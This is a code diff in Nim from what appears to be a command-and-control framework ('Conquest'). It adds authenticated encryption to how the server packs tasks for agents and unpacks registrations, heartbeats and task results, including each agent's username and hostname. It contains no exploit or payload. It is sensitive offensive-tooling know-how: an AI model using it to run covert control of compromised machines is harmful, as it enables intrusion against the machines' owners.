@@ -1,15 +1,14 @@
-import strutils, strformat, streams, times
+import strutils, strformat, streams, times, tables
 import ../utils
-import ../../common/[types, utils, serialize]
+import ../../common/[types, utils, serialize, crypto]
 
-proc serializeTask*(task: Task): seq[byte] = 
+proc serializeTask*(cq: Conquest, task: var Task): seq[byte] = 
 
     var packer = initPacker() 
 
     # Serialize payload
     packer
         .add(task.taskId)
-        .add(task.agentId)
         .add(task.listenerId)
         .add(task.timestamp)
         .add(task.command)
@@ -21,49 +20,46 @@ proc serializeTask*(task: Task): seq[byte] =
     let payload = packer.pack() 
     packer.reset()
 
-    # TODO: Encrypt payload body
+    # Encrypt payload body
+    let (encData, gmac) = encrypt(cq.agents[uuidToString(task.header.agentId)].sessionKey, task.header.iv, payload, task.header.seqNr)
+
+    # Set authentication tag (GMAC)
+    task.header.gmac = gmac
 
     # Serialize header 
     let header = packer.packHeader(task.header, uint32(payload.len))
 
-    # TODO: Calculate and patch HMAC
+    return header & encData
 
-    return header & payload
-
-proc deserializeTaskResult*(resultData: seq[byte]): TaskResult = 
+proc deserializeTaskResult*(cq: Conquest, resultData: seq[byte]): TaskResult = 
 
     var unpacker = initUnpacker(resultData.toString)
 
-    let 
-        magic = unpacker.getUint32()
-        version = unpacker.getUint8()
-        packetType = unpacker.getUint8()
-        flags = unpacker.getUint16()
-        seqNr = unpacker.getUint32()
-        size = unpacker.getUint32()
-        hmacBytes  = unpacker.getBytes(16) 
-
-        # Explicit conversion from seq[byte] to array[16, byte]
-    var hmac: array[16, byte]
-    copyMem(hmac.addr, hmacBytes[0].unsafeAddr, 16)
+    let header = unpacker.unpackHeader()
 
     # Packet Validation
-    if magic != MAGIC: 
+    if header.magic != MAGIC:
         raise newException(CatchableError, "Invalid magic bytes.")
 
-    if packetType != cast[uint8](MSG_RESPONSE): 
+    if header.packetType != cast[uint8](MSG_RESPONSE): 
         raise newException(CatchableError, "Invalid packet type for task result, expected MSG_RESPONSE.")
 
     # TODO: Validate sequence number 
 
-    # TODO: Validate HMAC
+    # Decrypt payload 
+    let payload = unpacker.getBytes(int(header.size))
 
-    # TODO: Decrypt payload 
-    # let payload = unpacker.getBytes(size)
+    let (decData, gmac) = decrypt(cq.agents[uuidToString(header.agentId)].sessionKey, header.iv, payload, header.seqNr)
+
+    # Verify that the authentication tags match, which ensures the integrity of the decrypted data and AAD
+    if gmac != header.gmac:
+        raise newException(CatchableError, "Invalid authentication tag (GMAC) for task result.")
+    
+    # Deserialize decrypted data
+    unpacker = initUnpacker(decData.toString)
 
     let 
         taskId = unpacker.getUint32()
-        agentId = unpacker.getUint32()
         listenerId = unpacker.getUint32()
         timestamp = unpacker.getUint32()
         command = unpacker.getUint16()
@@ -71,19 +67,10 @@ proc deserializeTaskResult*(resultData: seq[byte]): TaskResult =
         resultType = unpacker.getUint8()
         length = unpacker.getUint32()
         data = unpacker.getBytes(int(length))
-    
+
     return TaskResult(
-        header: Header(
-            magic: magic,
-            version: version,
-            packetType: packetType, 
-            flags: flags,
-            seqNr: seqNr,
-            size: size,
-            hmac: hmac 
-        ),
+        header: header,
         taskId: taskId,
-        agentId: agentId,
         listenerId: listenerId, 
         timestamp: timestamp,
         command: command,
@@ -93,39 +80,35 @@ proc deserializeTaskResult*(resultData: seq[byte]): TaskResult =
         data: data
     )
 
-proc deserializeNewAgent*(data: seq[byte]): Agent = 
+proc deserializeNewAgent*(cq: Conquest, data: seq[byte]): Agent = 
 
     var unpacker = initUnpacker(data.toString)
 
-    let 
-        magic = unpacker.getUint32()
-        version = unpacker.getUint8()
-        packetType = unpacker.getUint8()
-        flags = unpacker.getUint16()
-        seqNr = unpacker.getUint32()
-        size = unpacker.getUint32()
-        hmacBytes  = unpacker.getBytes(16) 
-
-    # Explicit conversion from seq[byte] to array[16, byte]
-    var hmac: array[16, byte]
-    copyMem(hmac.addr, hmacBytes[0].unsafeAddr, 16)
+    let header= unpacker.unpackHeader()
 
     # Packet Validation
-    if magic != MAGIC: 
+    if header.magic != MAGIC: 
         raise newException(CatchableError, "Invalid magic bytes.")
 
-    if packetType != cast[uint8](MSG_REGISTER): 
+    if header.packetType != cast[uint8](MSG_REGISTER): 
         raise newException(CatchableError, "Invalid packet type for agent registration, expected MSG_REGISTER.")
 
     # TODO: Validate sequence number 
 
-    # TODO: Validate HMAC
+    # Decrypt payload 
+    let sessionKey = unpacker.getKey()
+    let payload = unpacker.getBytes(int(header.size)) 
 
-    # TODO: Decrypt payload 
-    # let payload = unpacker.getBytes(size)
+    let (decData, gmac) = decrypt(sessionKey, header.iv, payload, header.seqNr)
+
+    # Verify that the authentication tags match, which ensures the integrity of the decrypted data and AAD
+    if gmac != header.gmac:
+        raise newException(CatchableError, "Invalid authentication tag (GMAC) for agent registration.")
+
+    # Deserialize decrypted data
+    unpacker = initUnpacker(decData.toString)
 
     let 
-        agentId = unpacker.getUint32()
         listenerId = unpacker.getUint32()
         username = unpacker.getVarLengthMetadata()
         hostname = unpacker.getVarLengthMetadata()
@@ -138,7 +121,7 @@ proc deserializeNewAgent*(data: seq[byte]): Agent =
         sleep = unpacker.getUint32()
 
     return Agent(
-        agentId: uuidToString(agentId),
+        agentId: uuidToString(header.agentId),
         listenerId: uuidToString(listenerId),
         username: username, 
         hostname: hostname,
@@ -152,51 +135,38 @@ proc deserializeNewAgent*(data: seq[byte]): Agent =
         jitter: 0.0,  # TODO: Remove jitter 
         tasks: @[],  
         firstCheckin: now(),
-        latestCheckin: now()
+        latestCheckin: now(),
+        sessionKey: sessionKey
     )
 
-proc deserializeHeartbeat*(data: seq[byte]): Heartbeat = 
+proc deserializeHeartbeat*(cq: Conquest, data: seq[byte]): Heartbeat = 
 
     var unpacker = initUnpacker(data.toString)
 
-    let 
-        magic = unpacker.getUint32()
-        version = unpacker.getUint8()
-        packetType = unpacker.getUint8()
-        flags = unpacker.getUint16()
-        seqNr = unpacker.getUint32()
-        size = unpacker.getUint32()
-        hmacBytes  = unpacker.getBytes(16) 
-
-    # Explicit conversion from seq[byte] to array[16, byte]
-    var hmac: array[16, byte]
-    copyMem(hmac.addr, hmacBytes[0].unsafeAddr, 16)
+    let header = unpacker.unpackHeader()
 
     # Packet Validation
-    if magic != MAGIC: 
+    if header.magic != MAGIC: 
         raise newException(CatchableError, "Invalid magic bytes.")
 
-    if packetType != cast[uint8](MSG_HEARTBEAT):
+    if header.packetType != cast[uint8](MSG_HEARTBEAT):
         raise newException(CatchableError, "Invalid packet type for checkin request, expected MSG_HEARTBEAT.")
 
     # TODO: Validate sequence number 
 
-    # TODO: Validate HMAC
+    # Decrypt payload 
+    let payload = unpacker.getBytes(int(header.size))
+    let (decData, gmac) = decrypt(cq.agents[uuidToString(header.agentId)].sessionKey, header.iv, payload, header.seqNr)
 
-    # TODO: Decrypt payload 
-    # let payload = unpacker.getBytes(size)
+    # Verify that the authentication tags match, which ensures the integrity of the decrypted data and AAD
+    if gmac != header.gmac:
+        raise newException(CatchableError, "Invalid authentication tag (GMAC) for heartbeat.")
+
+    # Deserialize decrypted data
+    unpacker = initUnpacker(decData.toString)
 
     return Heartbeat(
-        header: Header(
-            magic: magic,
-            version: version,
-            packetType: packetType, 
-            flags: flags,
-            seqNr: seqNr,
-            size: size,
-            hmac: hmac 
-        ),
-        agentId: unpacker.getUint32(),
+        header: header,
         listenerId: unpacker.getUint32(),
         timestamp: unpacker.getUint32()
     )
